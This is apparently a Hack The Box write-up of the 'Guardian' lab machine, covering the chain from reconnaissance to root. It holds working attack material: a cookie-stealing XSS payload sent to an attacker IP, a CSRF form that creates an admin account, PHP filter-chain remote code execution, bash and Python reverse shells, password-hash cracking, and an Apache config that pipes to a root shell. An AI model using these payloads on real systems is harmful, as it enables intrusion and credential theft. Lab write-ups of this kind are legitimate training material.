
<div align=center>

# Guardian Machine Write-up

[HTB Machine Certificate](https://labs.hackthebox.com/achievement/machine/2088593/703)

</div>

# Reconnaissance

1. **Starting with nmap only 22 SSH and 80 http are open.**

    ```bash
    ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.84 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sC -sV 10.10.11.84
    ```

    ```bash
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
    |_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
    80/tcp open  http    Apache httpd 2.4.52
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    |_http-title: Guardian University - Empowering Future Leaders
    Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```

## Website

2. **Accessing the webpage, the student portal stood out.**  
    http://portal.guardian.htb/login.php 

    Upon accessing the login page, a message is displayed in the top-right corner of the screen. With the `Portal Guide` link lead to: http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf 

        “Welcome to the Student Portal!
        Please don't forget to checkout the Portal Guide”

3. **This link hosts a pdf file containing information about the student portal. Where a default password was found.**

    ![][image1]    

    That led to the hypotheses of attempting password spraying attacks. The student ID format (`GUXXXXXXX`) is shown in the placeholder of the username input. 

    ![][image2]

4. **Analyzing the Home page for users information** 

    It was found that the “about us” section states the university has over 15.000 students.** 

    ![][image3]

    Nevertheless, just below, a section containing user testimonials reveals three students IDs, with values over 15.000.

    ![][image4]

# Web

## Initial Access

5. **Attempting logging in with the discovered IDs using the `default password`, the first ID successfully authenticated as user `Boone Basden`. The other two did not.**

    Username: `GU0142023` password `GU1234`

6. **After logging in, a dashboard page was displayed along with a side menu containing other sections.**

    In the user profile, a field named `role` reveals that this user is a `student`. Indicates that there may be other roles.

    In the "assignments" section, one assignment was found with “upcoming” status. This assignment contained a field for file upload in `.docx` and `.xlsx` formats. However, at this moment,there was no way found to access the uploaded file. 

    http://portal.guardian.htb/student/submission.php?assignment_id=15

## Exploitation

### IDOR

6. **In the chat section, there are two conversations. When accessing one of them, it was observed that the URL contains two parameters and uses an ID to access.**

    http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=11
    http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=14

    By manually testing it was possible to access conversations between other users. In the conversation between users with `ID 1` `jamil.enockson` and `ID 2` `admin` a credential was found.

    http://portal.guardian.htb/student/chat.php?chat_users[0]=1&chat_users[1]=2

    ![][image5]

7. **At first, this credentials was assumed to be username:password combination, however it did not work with SSH.**

    Then, a search was made for users with `gitea` username in the platform, but was not found. 
    
    Then, a google search was performed for `gitea` and discovered it is a git version control tool name, like github: https://about.gitea.com.

8. **The last alternative at the time was to try `gitia` as a subdomain, since a new login page was the only way to use the discovered credentials. Then, the `gitia` subdomain  was found.** 

    * http://gitea.guardian.htb/  
    * http://gitea.guardian.htb/user/login

    User `jamil` password `DHsNnk3V503`

9. **logging in to Gitea with `jamil` user.**

    In the menu under the "Explore" section, the repositories of both the main domain and portal subdomain were available. 
    
    It was discovered that there are three user types: `student`, `lector` and `admin`. The portal repository was downloaded and opened in VScode for better code analysis.

### Code analysis

10. **The `config.php` file was found containing database `root` credentials, and `salt`.**

    ```php
    // portal.guardian.htb /config/config.php 
    <?php
    return [
        'db' => [
            'dsn' => 'mysql:host=localhost;dbname=guardiandb',
            'username' => 'root',
            'password' => 'Gu4rd14n_un1_1s_th3_b3st',
            'options' => []
        ],
        'salt' => '8Sb)tM1vs1SS'
    ];
    ```   
    
11. **Reviewing the application logic, no vulnerability were found in the implementation. and the only exposed endpoints that should admin verification were found in:**    

    - portal.guardian.htb/admin/reports/academic.php
    - portal.guardian.htb/admin/reports/enrollment.php
    - portal.guardian.htb/admin/reports/financial.php
    - portal.guardian.htb/admin/reports/system.php
    
12. **Analyzing the code related to the `lecturer` user's access when a `student` submit a file (`/student/submission.php?assignment_id=15`) showed that it uses the `PhpSpreadsheet` library.**

    ```php 
    // portal.guardian.htb/lecturer/view-submission.php

    use PhpOffice\PhpSpreadsheet\IOFactory;
    use PhpOffice\PhpSpreadsheet\Writer\Html;
    
    <SNIP>

    <?php if (pathinfo('../attachment_uploads/' . $submission['attachment_name'], PATHINFO_EXTENSION) === 'xlsx'): ?>
        <div class="mt-8">
            <h3 class="font-semibold text-gray-800 mb-3">Document Preview</h3>
            <div class="overflow-x-auto bg-white p-4 border border-gray-200 rounded-lg">
                <?php
                $spreadsheet = IOFactory::load('../attachment_uploads/' . $submission['attachment_name']);
                $writer = new Html($spreadsheet);
                $writer->writeAllSheets();
                echo $writer->generateHTMLAll();
                ?>
            </div>
        </div>
    <?php elseif (pathinfo('../attachment_uploads/' . $submission['attachment_name'], PATHINFO_EXTENSION) === 'docx'): ?>
        <div class="mt-8">
            <h3 class="font-semibold text-gray-800 mb-3">Word Document Preview</h3>
            <div class="bg-white p-4 border border-gray-200 rounded-lg">
                <?php
                $phpWord = \PhpOffice\PhpWord\IOFactory::load('../attachment_uploads/' . $submission['attachment_name']);
                $htmlWriter = \PhpOffice\PhpWord\IOFactory::createWriter($phpWord, 'HTML');
                $htmlWriter->save('php://output');
                ?>
            </div>
        </div>
    ```    

    In the `composer.json` file the `PhpSpreadsheet` version.

    ```json
    // portal.guardian.htb/composer.json
    {
        "require": {
            "phpoffice/phpspreadsheet": "3.7.0",
            "phpoffice/phpword": "^1.3"
        }
    }
    ```

### Stored XSS

13. **Searching for known vulnerabilities in `phpspreadsheet 3.7.0`, severals CVEs of the reflected XSS were found.**

    This means that user input is not sanitized and returned as rendered HTML in the browser.

    `CVE-2024-56365`  
    * <u>Location:</u>  `samples/download.php`  
    * <u>Parameter:</u>  Download Parameter. 

    `CVE-2024-56366`  
    * <u>Location:</u> `samples/Wizards/NumberFormat/Accounting.php`  
    * <u>Parameter:</u> Formatting parameter.

    `CVE-2024-56409`   
    * <u>Location:</u> `samples/Wizards/NumberFormat/Currency.php`  
    * <u>Parameter:</u> Currency parameter.

    `CVE-2024-56408`  
    * <u>Location:</u> `Engineering/Convert-Online.php`  
    * <u>Parameter:</u> Converter parameter.
    
    `CVE-2024-56411`
    * <u>Location:</u> `Writer\Html header (HyperlinkBase)`
    * <u>Parameter:</u> Base hyperlink value.


    <u>In the current application situation, the following occurs:</u>

    1. The `lecturer` user loads the `.xlsx` file that comes from `student` user upload.
    2. Convert to HTML using `PhpSpreadsheet\Writer\Html`.
    3. Rendered in the browser.
    
    In this case, the CVE that should be used for exploitation is `CVE-2024-56411`. 

    https://www.miggo.io/vulnerability-database/cve/CVE-2024-56411 

14. **Searching for how to exploit it**

    Searching for how exploit it, `phpspreadsheet xss xlsx`, a repository was found: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx.

    In this repository is explained:
    1. Multiple  sheets must be created.
    2. The payload must be entered in the name of one of the pages.
    
15. **Creating the file containing the payload**
    A problem arose, all xlsx editors limit name length or restrict certain characters.

    Them, it was necessary to create a code to generate the xlsx file containing the payload.

    https://github.com/Lucasvmarangoni/xlsx-xss-sheetname-generator 

    <u>Payload</u> 
    ```javascript
    '><script>fetch('http://10.10.14.223:443/steal?cookie='+document.cookie)</script>
    ```
    
    <u>Generating the xlsx file with payload</u>
    ```bash
    go run generate.go -payload "'><script>fetch('http://10.10.14.223:443/steal?cookie='+document.cookie)</script>"
    ```

## Privilege Escalation - Lecturer

16. **The server was started in attacker machine and the file was uploaded in the ‘Statistics in Business’ assignment** 
    The cookie of the lecturer responsible for this assignment, `Sammy Treat`, was received by the server. 

    ![][image6]

17. **Using the obtained cookie, the login was performed successfully, granting access to the `Sammy Treat` lecturer account.**

## Exploitation - Lecturer

18. **Analyzing the lecture menu option, was observed there is a section called `Notice Board` that allows create a notice.**

19. **After click on `Create Notice`, the `Title`, `Content`, and `Reference Link` fields are displayed. In the last field contain the message `"will be reviewed by admin"`.**

20. **It was not possible to obtain the admin's cookie, however while analyzing other possibilities, it was identified that the admin user can create new users.** 


21. **Analyzing of the `createuser` file (`portal.guardian.htb/admin/createuser.php`) and after the `/config/csrf-tokens.php` file revealed that the code does not bind tokens to specific users and only verifies whether the token is valid.** 
    
    This means that a token generated in any client browser can be reused.

    ```php
    // /config/csrf-tokens.php
    <?php

    $global_tokens_file = __DIR__ . '/tokens.json';

    function get_token_pool()
    {
        global $global_tokens_file;
        return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : [];
    }

    function add_token_to_pool($token)
    {
        global $global_tokens_file;
        $tokens = get_token_pool();
        $tokens[] = $token;
        file_put_contents($global_tokens_file, json_encode($tokens));
    }

    function is_valid_token($token)
    {
        $tokens = get_token_pool();
        return in_array($token, $tokens);
    }

    ```
    * **add_token_to_pool($token)**: Add a token in the file.
    * **get_token_pool()**: Read all existing tokens.
    * **is_valid_token($token)**: Verify whether the provided token exists.

### CSRF

22. **The HTML code was created to exploit it, containing a pre-filled form and that is automatically submitted to create a user.**

    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Auto Create Admin</title>
    </head>
    <body>
        <form id="exploitForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
            <input type="hidden" name="username" value="ldk">
            <input type="hidden" name="password" value="ldk">
            <input type="hidden" name="full_name" value="Fulano">
            <input type="hidden" name="email" value="example@mail.com">
            <input type="hidden" name="dob" value="1990-01-01">
            <input type="hidden" name="address" value="RuaX">
            <input type="hidden" name="user_role" value="admin">
            <input type="hidden" name="csrf_token" value="93042eb16839f481fe93f109de8e48a4">
        </form>

        <script>
            document.getElementById('exploitForm').submit();
        </script>
    </body>
    </html>
    ```

## Privilege Escalation - Admin

23. **A server was started on the attacker's machine, and the link was submitted in the `Reference Link` field.** 
    
    When the admin clicks on the link, the file is rendered in the browser, triggering a POST request that creates a new user.

        By default, the server sends the Content-Type: text/html header in the response when it detects an .html file. Because of this, the browser interprets it as a page and renders the content instead of downloading the file.

    http://10.10.14.223:443/exploit.html

    ![][image7]

24. **Then the created account with admin rule was successfully accessed.**

## Exploitation - Admin

25. **The first thing that caught attention was the `Settings` option in de admin's menu, as it did not exist in the others.** 

    Accessing the Settings section, `Security Settings` includes an `IP whitelist` field. However, it's not possible to save the changes, as they are not persisted after clicking on `Save all change` button.

    
26. **Another admin page that caught attention was the `reports` page. This page has a url parameter used to access report files.**

    Analyzing the reports page code was identified two filters.
    
    ```php
    if (strpos($report, '..') !== false) {
        die("<h2>Malicious request blocked 🚫 </h2>");
    }   

    if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
        die("<h2>Access denied. Invalid file 🚫</h2>");
    }
    ```
    1. The first conditional filters by two dots (`..`).
    2. The second conditional is a whitelist-based file inclusion filter.

27. **PHP wrappers.**
    
    <u>An initial attempt using the `filter` wrapper worked</u>
    * `php://filter/read=convert.base64-encode/resource=reports/system.php`

    <u>However attempts using the `data` wrapper didn't work</u>
    * `data://text/plain,<?php system("curl http://10.10.10.14.223:8000"); ?>,reports/enrollment.php`
    * `data://text/plain;base64,PD9waHAgc3lzdGVtKCJjdXJsIGh0dHA6Ly8xMC4xMC4xMC4xNC4yMjM6ODAwMCIpOz8+,reports/enrollment.php`

    <br>

    
    > I do not have much experience with PHP, however, I have previously exploited vulnerabilities involving PHP wrappers on other machines. At this point, I wondered whether it was possible to concatenate multiples wrappers.
        

### Chains php wrappers

28. **Searching on google for PHP wrappers chains.**

    ![][image8]

    This article was found: https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a
    
    > “To automate this process, a tool like PHP Filter Chain Generator can be employed. The tool is designed to automate the creation of filter chains, which can transform harmless strings into malicious payloads. In essence, this works by tricking the PHP interpreter into processing and executing malicious payload as if it were a regular” Mostafa Lashin, Nov 6, 2024

    The article author recommends a python tool.

    https://github.com/synacktiv/php_filter_chain_generator  
    `python3 php_filter_chain.py --chain '<?php system("id");?>'`
    
29. **Creating the Chains php wrappers exploit.**

    ```bash
    python3 php_filter_chain_generator.py --chain '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.14.223/443 0>&1'\''");?>' 
    ```

# Host Compromise

## Initial Access - www-data

30. **After sending the payload, a reverse shell was obtained.**
    The result is too large to past here, but it must be inserted in the following format:

    ` ?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|<SNIP…>,reports/enrollment.php`

## Exploitation

31. **Initial checks.**

    ```bash
    www-data@guardian:~/portal.guardian.htb/admin$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@guardian:~/portal.guardian.htb/admin$ ls -l /home
    total 16
    drwxr-x--- 3 gitea gitea 4096 Jul 14 16:57 gitea
    drwxr-x--- 4 jamil jamil 4096 Sep  8 14:19 jamil
    drwxr-x--- 5 mark  mark  4096 Sep  8 13:50 mark
    drwxr-x--- 6 sammy sammy 4096 Sep  8 10:47 sammy
    ```

32. **Accessing MySQL database.**

    As previously mentioned, when accessing `Gitea` and exploring the files, the database `root` credentials were found in `/config/config.php`.
    
    ```bash
    www-data@guardian:~/portal.guardian.htb/admin$ mysql -u root -p
    mysql -u root -p
    Enter password: Gu4rd14n_un1_1s_th3_b3st

    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 197
    Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

    Copyright (c) 2000, 2025, Oracle and/or its affiliates.

    Oracle is a registered trademark of Oracle Corporation and/or its
    affiliates. Other names may be trademarks of their respective
    owners.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
    mysql> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | guardiandb         |
    | information_schema |
    | mysql              |
    | performance_schema |
    | sys                |
    +--------------------+
    5 rows in set (0.00 sec)

    mysql> use guardiandb;
    use guardiandb;
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Database changed
    mysql> show tables;
    show tables;
    +----------------------+
    | Tables_in_guardiandb |
    +----------------------+
    | assignments          |
    | courses              |
    | enrollments          |
    | grades               |
    | messages             |
    | notices              |
    | programs             |
    | submissions          |
    | users                |
    +----------------------+
    9 rows in set (0.00 sec)
    ```

    With access to the user table, the password hashes of the web application users were obtained. 

    ![][image9]

### Cracking Password Hashes

33. **Password Hash Cracking.**

    Only the password hashes of system users were included to cracking: `jamil`, `mark` and `sammy`.

    In the `login.php` file reveals that the hash algorithm used is `SHA-256`.

        jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250
        mark.pargetter:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e
        sammy.treat:c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2


    The salt must be added to the hash before cracking.

        c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
        8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
        c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2:8Sb)tM1vs1SS

    ```bash
    hashcat -m 1410 --username hashes /home/lucas/workspace/wordlists/rockyou.txt
    ```

    ```bash
    <SNIP>
    Dictionary cache hit:
    * Filename..: /home/lucas/workspace/wordlists/rockyou.txt
    * Passwords.: 14344384
    * Bytes.....: 139921497
    * Keyspace..: 14344384

    c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
    <SNIP>
    ```

## Privilege Escalation - jamil

34. **`The `jamil` credentials were obtained successfully.`**
    His passowrd is `Copperhouse56`.

## Exploitation - jamil

35. **Initial checks**

    The `jasmil` user is a member of the `admins` group, which is promising to privilege escalation to `root`.
    ```bash
    jamil@guardian:~$ id
    uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
    ```
    
    Searching for files and directories owned by `admins` group.

    ```bash
    jamil@guardian:~$ find / -group admins -exec ls -ld {} \; 2>/dev/null
    drwxr-sr-x 4 root admins 4096 Jul 10 13:53 /opt/scripts/utilities
    drwxrws--- 2 mark admins 4096 Sep  8 14:30 /opt/scripts/utilities/output
    -rw-r----- 1 root admins 287 Apr 19 08:15 /opt/scripts/utilities/utils/attachments.py
    -rw-r----- 1 root admins 246 Jul 10 14:20 /opt/scripts/utilities/utils/db.py
    -rwxrwx--- 1 mark admins 217 Sep  8 16:12 /opt/scripts/utilities/utils/status.py
    -rw-r----- 1 root admins 226 Apr 19 08:16 /opt/scripts/utilities/utils/logs.py
    -rwxr-x--- 1 root admins 1136 Apr 20 14:45 /opt/scripts/utilities/utilities.py
    ```

    The `jamil` user has `sudo` permissions to run  `/opt/scripts/utilities/utilities.py` as `mark` user.
    ```bash
    jamil@guardian:~$ sudo -l
    Matching Defaults entries for jamil on guardian:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

    User jamil may run the following commands on guardian:
        (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
    ```

### Code analysis

36. **Further analysis of the Python files owned by the `admins` group.**

    The `/opt/scripts/utilities/utils/db.py` file also expose the root database credentials in plaintext.

    ```bash
    jamil@guardian:~$ cat /opt/scripts/utilities/utils/db.py
    import os

    def backup_database():
        output_file = "/opt/scripts/utilities/output/guardiandb_backup.sql"
        os.system(f"/usr/bin/mysqldump -u root -pGu4rd14n_un1_1s_th3_b3st guardiandb > {output_file}")
        print("Database backup completed.")
    ```

    Write permission in `status.py`.

    `-rwxrwx--- 1 mark admins 217 Sep  8 16:12 /opt/scripts/utilities/utils/status.py`

    ```python
    import platform
    import psutil
    import os

    def system_status():
        print("System:", platform.system(), platform.release())
        print("CPU usage:", psutil.cpu_percent(), "%")
        print("Memory usage:", psutil.virtual_memory().percent, "%")

    ```

    The `utilities.py` file calls `status.py` when the `system-status` flag is used and does not require the `mark` user, unlike the other actions.  


    `-rwxr-x--- 1 root admins 1136 Apr 20 14:45 /opt/scripts/utilities/utilities.py`

    ```python
    #!/usr/bin/env python3

    import argparse
    import getpass
    import sys

    from utils import db
    from utils import attachments
    from utils import logs
    from utils import status


    def main():
        parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
        parser.add_argument("action", choices=[
            "backup-db",
            "zip-attachments",
            "collect-logs",
            "system-status"
        ], help="Action to perform")
        
        args = parser.parse_args()
        user = getpass.getuser()

        if args.action == "backup-db":
            if user != "mark":
                print("Access denied.")
                sys.exit(1)
            db.backup_database()
        elif args.action == "zip-attachments":
            if user != "mark":
                print("Access denied.")
                sys.exit(1)
            attachments.zip_attachments()
        elif args.action == "collect-logs":
            if user != "mark":
                print("Access denied.")
                sys.exit(1)
            logs.collect_logs()
        elif args.action == "system-status":
            status.system_status()
        else:
            print("Unknown action.")

    if __name__ == "__main__":
        main()
    ```

    This means it is possible to edit the `status.py` content with a payload to gain a shell as `mark` user when `utilities.py` is executed as `mark` using the `system-status` flag.

## Privilege Escalation - mark

37. **Gaining a shell as `mark` user**

    The following payload was inserted into the `/opt/scripts/utilities/utils/status.py` file.

    ```python
    import socket, os, pty

    def system_status():
        s = socket.socket()
        s.connect(("10.10.14.223", 443))  
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")
    ```

    A server was started On the attacker's machine, and then the `utilities.py` was executed as `mark` on the target host.

    ```bash
    jamil@guardian:/tmp/.ldk$ sudo -u mark /opt/scripts/utilities/utilities.py system-status > /dev/null 2>&1 &
    ```

    ![][image10]


    * The status.py file was restored to its original content so avoid interfering with other players on this machines.

## Exploitation - mark

38. **Initial checks**

    ```bash
    mark@guardian:~/confs$ id
    id
    uid=1001(mark) gid=1001(mark) groups=1001(mark),1002(admins)
    ```

    The `mark` user had `sudo` permission for `/usr/local/bin/safeapache2ctl`.

    ```bash
    mark@guardian:~/confs$ sudo -l
    sudo -l
    Matching Defaults entries for mark on guardian:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
        use_pty

    User mark may run the following commands on guardian:
        (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
    ```

39. **Analyzing the `safeapache2ctl` script**

    When attempting to run `/usr/local/bin/safeapache2ctl`, a message indicated that the `-f` flag and a path to `/home/mark/confs/file.conf` were required.

    ```bash
    Usage: /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf
    ```

    The `safeapache2ctl` script is a wrapper for the `apache2` binary that allows a server to be started using a configuration file.


## Privilege Escalation - root


40. **A file containing a payload to gain a root shell was created in the `/home/mark/confs/` directory**

    ```bash
    mark@guardian:~/confs$ cat <<'EOF' > /home/mark/confs/malicious.conf
    ServerRoot "/etc/apache2"
    ServerName localhost
    PidFile /home/mark/apache_test/apache2.pid
    Listen 8888

    LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
    LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so

    ErrorLog "|/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.223/8000 0>&1'"

    DocumentRoot "/var/www/html"
    <Directory "/var/www/html">
        Require all granted
    </Directory>
    EOF
    ```

    <u>This fileds must be properly configured in the `.conf` file</u>:

    ```bash
    PidFile /home/mark/apache_test/apache2.pid: define onde o Apache vai gravar o PID da instância que ele está a subir.
    Listen 8888.
    ServerName localhost
    ```

### Root

41. **After starting the server lineing on the attacker's machine, the command was executed, and a root shell was obtained.**

    ```bash
    mark@guardian:~/confs$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/malicious.conf 
    sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/malicious.conf 
    ```

    ![][image11]
    


[image11]: files/htb-guardian-machine/image11.png
[image10]: files/htb-guardian-machine/image10.png
[image9]: files/htb-guardian-machine/image9.png
[image8]: files/htb-guardian-machine/image8.png
[image7]: files/htb-guardian-machine/image7.png
[image6]: files/htb-guardian-machine/image6.png
[image5]: files/htb-guardian-machine/image5.png
[image4]: files/htb-guardian-machine/image4.png
[image3]: files/htb-guardian-machine/image3.png
[image2]: files/htb-guardian-machine/image2.png
[image1]: files/htb-guardian-machine/image1.png